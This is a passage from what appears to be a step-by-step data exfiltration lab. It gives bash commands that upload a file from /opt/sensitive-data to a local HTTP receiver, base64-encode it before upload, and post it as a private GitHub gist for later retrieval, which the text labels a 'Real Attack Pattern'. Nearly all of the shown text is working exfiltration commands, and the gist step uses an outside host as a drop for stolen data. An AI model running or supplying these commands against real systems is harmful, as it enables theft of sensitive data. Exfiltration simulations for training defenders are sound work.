## Step 2 – Local Simulation (transfer.sh style)
```bash
# Start local "cloud" receiver:
mkdir -p /tmp/cloud_bucket && cd /tmp/cloud_bucket
python3 -m http.server 9090 &

# Upload file (PUT method):
curl -T /opt/sensitive-data/exfil_data.txt http://localhost:9090/stolen_data.txt
# GET it back:
curl http://localhost:9090/stolen_data.txt
```

## Step 3 – Base64 encode → Cloud (avoids binary issues)
```bash
# Encode:
base64 /opt/sensitive-data/exfil_data.txt > /tmp/encoded_exfil.txt
# Upload:
curl -T /tmp/encoded_exfil.txt http://localhost:9090/
# Recover:
curl -s http://localhost:9090/encoded_exfil.txt | base64 -d
```

## Step 4 – GitHub Gist (Real Attack Pattern)
```bash
DATA=$(cat /opt/sensitive-data/exfil_data.txt | python3 -c "import sys,json; print(json.dumps(sys.stdin.read()))")
curl -s -H "Authorization: token GITHUB_PAT" \
     -d "{\"public\":false,\"files\":{\"data.txt\":{\"content\":$DATA}}}" \
     https://api.github.com/gists
# Returns URL of private gist — attacker retrieves it later
```
